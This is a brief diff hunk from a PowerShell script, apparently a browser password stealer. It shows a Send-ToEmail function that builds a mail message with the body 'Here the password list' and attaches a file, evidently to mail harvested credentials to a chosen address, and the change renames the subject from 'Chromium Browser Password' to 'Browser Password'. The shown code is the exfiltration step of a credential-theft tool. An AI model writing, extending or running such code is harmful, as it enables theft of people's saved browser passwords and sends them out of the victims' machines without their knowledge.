@@ -8,7 +8,7 @@ function Send-ToEmail([string]$email, [string]$attachmentpath){
     $message = new-object Net.Mail.MailMessage;
     $message.From = $Username;
     $message.To.Add($email);
-    $message.Subject = "Chromium Browser Password";
+    $message.Subject = "Browser Password";
     $message.Body = "Here the password list";
     $attachment = New-Object Net.Mail.Attachment($attachmentpath);
     $message.Attachments.Add($attachment);
